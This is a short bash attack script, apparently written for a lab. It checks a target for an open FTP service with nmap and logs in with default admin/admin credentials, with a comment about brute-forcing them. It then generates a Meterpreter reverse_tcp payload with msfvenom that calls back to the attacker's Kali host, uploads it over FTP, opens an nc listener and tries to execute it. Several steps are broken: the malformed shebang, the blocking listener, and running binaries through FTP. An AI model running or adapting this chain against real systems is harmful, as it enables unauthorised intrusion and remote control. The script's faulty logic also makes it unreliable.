#!bin/bash


TARGET="192.168.71.X" # Target IP in Reconnaissance
USER="admin" # Username could be list and iterating bruteforce
PASS="admin" # Same as Admin
PAYLOAD="shell.elf"
KALI="192.168.71.Y" # Kali IP

nmap -sV -p 21 $TARGET | grep "21/tcp open" > /dev/null

if [ $? -eq 0 ]; then
    echo "Service is UP"
else
    echo "Service is DOWN"
    exit 1
fi


ftp -n -v $TARGET << EOT

quote USER $USER
quote PASS $PASS

EOT


msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$KALI LPORT=4444 -f elf > $PAYLOAD

ftp -n -v $TARGET << EOT
quote USER $USER
quote PASS $PASS
put $PAYLOAD
EOT

nc -lvp 4444
sleep 2
ftp -n -v $TARGET << EOT
quote USER $USER
quote PASS $PASS
chmod +x $PAYLOAD
./$PAYLOAD
EOT

